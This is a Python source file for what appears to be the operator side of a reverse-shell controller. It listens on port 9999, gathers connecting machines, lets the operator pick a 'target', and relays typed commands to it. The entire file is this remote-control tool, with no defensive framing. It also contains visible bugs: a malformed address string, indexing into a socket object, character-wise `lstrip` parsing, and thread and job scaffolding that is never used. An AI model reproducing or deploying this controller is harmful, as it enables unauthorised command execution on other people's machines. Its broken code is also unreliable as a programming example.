import imp
import queue
import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
connections = []
addresses = []


# Creating a socket for connecting two computers.
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as sem:
        print("Socket could not be created. Error Message: {}".format(sem))


# Binding the socket and listening for incoming connections.
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port {}".format(str(port)))

        s.bind((host, port))
        s.listen(5)

    except socket.error as sem:
        print("Socket could not be binded. Error Message: {}".format(sem))
        bind_socket()


# Handling and saving multiple connections.
# Closing previous connections when server.py file is restarted.
def accept_connection():

    for c in connections:
        c.close()

    del connections[:]
    del addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # Prevents timeout

            connections.append(conn)
            addresses.append(address)

            print("Connection has been established: {}".format(address[0]))

        except:
            print("Error connection could not established.")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client.
# Interactive prompt for sending commands.
def start_cmp():
    cmd = input("CMP: ")

    if cmd == "help":
        cmp_help()

    elif "list" in cmd:
        list_connections()

    elif "select" in cmd:
        conn = get_target(cmd)
        if conn is not None:
            send_commands(conn)

    else:
        print("Unknown command, to see all commands enter help command.")


# Display a help message for cmp.
def cmp_help():
    print(
        "---COMMANDS---\nhelp: print help message\nlist: list all available connections.\nselect: select and connect to a connection.(Example: select 0)"
    )


# Display all current active connnections with the client.
def list_connections():
    results = ""

    if not connections:
        print("There is no client connected to you\n")

    else:

        for i, conn in enumerate(connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(201480)
            except:
                del connections[i]
                del addresses[i]
                continue

            results = "{}   {}  {}  \n".format(
                str(i), str(addresses[i][0], addresses[i][1])
            )

        print("---Clients---\n{}".format(results))


def get_target(cmd):
    try:
        target = int(cmd.lstrip("select "))
        conn = connections[target]
        print(
            "Selected target{}|{}{}".format(
                target, connections[target][0], connections[target][1]
            )
        )
        return conn

    except:
        print("Selection not valid.")
        return None


# Send commands to client.


def send_commands(conn):
    init = True
    while True:
        try:
            if init:
                initial_response = str(conn.recv(1024), "utf-8")
                print(initial_response, end="")
                init = False

            cmd = input()

            if cmd == "quit":
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Error command could not be sent.")
